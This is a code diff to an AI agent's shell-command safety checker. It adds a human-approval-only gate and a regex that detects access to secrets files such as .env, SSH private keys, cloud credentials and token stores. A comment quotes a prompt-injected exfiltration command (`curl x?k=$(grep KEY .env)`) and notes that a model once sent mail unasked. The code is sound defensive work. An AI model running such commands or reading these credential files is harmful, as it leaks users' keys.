@@ -213,7 +213,26 @@ def detect_hardline_command(command: str) -> tuple:
 # not a system risk the guardian LLM is asked to judge (it APPROVEs "benign script execution"), and a
 # small model ignored the skill's "confirm first" rule and sent mail unasked. Always a human's call.
 GOOGLE_ACCOUNT_ACTION = "acts on the user's Google account (sends email or changes Calendar, Drive, Docs or Sheets)"
-HUMAN_ONLY_DESCRIPTIONS = frozenset({GOOGLE_ACCOUNT_ACTION})
+# Reading a secrets file hands keys to whatever the agent was told to do with them, and a prompt-
+# injected `curl x?k=$(grep KEY .env)` sends them out before any output redaction runs; writing one
+# can repoint a provider's base URL so the keys go elsewhere. read_file already refuses these paths
+# (agent/file_safety.py); this is the shell side.
+SECRET_FILE_ACCESS = "touches a secrets file (API keys, tokens or private keys)"
+HUMAN_ONLY_DESCRIPTIONS = frozenset({GOOGLE_ACCOUNT_ACTION, SECRET_FILE_ACCESS})
+# Asked every time, never remembered: an "always allow" would take the wall down for good.
+ONCE_ONLY_DESCRIPTIONS = frozenset({SECRET_FILE_ACCESS})
+_SECRET_FILE = (
+    # .env and .env.<stage>, but not the documented-shape copies (.env.example etc.) nor
+    # `process.env` / `foo.env` / `.envrc`.
+    r'(?<![\w.-])\.env(?:\.(?!(?:example|sample|template|dist|defaults?)\b)[a-z0-9_-]+)?(?![\w.-])'
+    # Scout's own credential stores (agent/file_safety.py _CREDENTIAL_FILE_NAMES / _READ_DENIED_DIRS).
+    r'|\bgoogle_(?:token|client_secret)\.json\b|\.anthropic_oauth\.json\b'
+    r'|(?:\.scout|scout_home\}?)/(?:[^\s/"\'`]+/)*'
+    r'(?:auth\.json|auth\.lock|webhook_subscriptions\.json|mcp-tokens|vault|browser-profile)\b'
+    # The user's own: SSH private keys (not .pub), cloud and registry credentials.
+    r'|\.ssh/id_[\w-]+\b(?!\.pub)|\.aws/credentials\b|\.config/gcloud/\S*credentials'
+    r'|\.netrc\b|\.pgpass\b|\.docker/config\.json\b|\.kube/config\b'
+)
 
 # ---- Dangerous command patterns -----------------------------------------------------------
 DANGEROUS_PATTERNS = [
@@ -470,6 +489,11 @@ DANGEROUS_PATTERNS = [
 
 
 DANGEROUS_PATTERNS_COMPILED = [(re.compile(p, _RE_FLAGS), d) for p, d in DANGEROUS_PATTERNS]
+# Scanned on every command in addition to DANGEROUS_PATTERNS (whose first match names the prompt):
+# a human-only finding must reach the gate even when another pattern matched first.
+_HUMAN_ONLY_PATTERNS_COMPILED = [
+    (re.compile(p, _RE_FLAGS), d) for p, d in DANGEROUS_PATTERNS if d in HUMAN_ONLY_DESCRIPTIONS
+] + [(re.compile(_SECRET_FILE, _RE_FLAGS), SECRET_FILE_ACCESS)]
 # Dynamic-word rules look for glob/brace characters, which are ordinary data inside quotes
 # (`find . -name 'log-del*'`), so they scan the quote-masked variant like the positionless hardline rules.
 _QUOTE_MASKED_DANGEROUS_DESCRIPTIONS = frozenset({
@@ -1530,6 +1554,17 @@ def _is_shell_token_spliced_gateway_lifecycle(command: str) -> bool:
     except Exception:
         return False
     return contains_gateway_lifecycle_command(command)
+
+
+def detect_human_only(command: str) -> str | None:
+    """Description of the first human-only finding in *command* (account actions, secrets files),
+    or None. These never go to the smart guardian; see HUMAN_ONLY_DESCRIPTIONS."""
+    for command_variant in _command_detection_variants(command):
+        command_lower = _lower_preserving_flags(command_variant)
+        for pattern_re, description in _HUMAN_ONLY_PATTERNS_COMPILED:
+            if pattern_re.search(command_lower):
+                return description
+    return None
 
 
 def detect_dangerous_command(command: str) -> tuple:
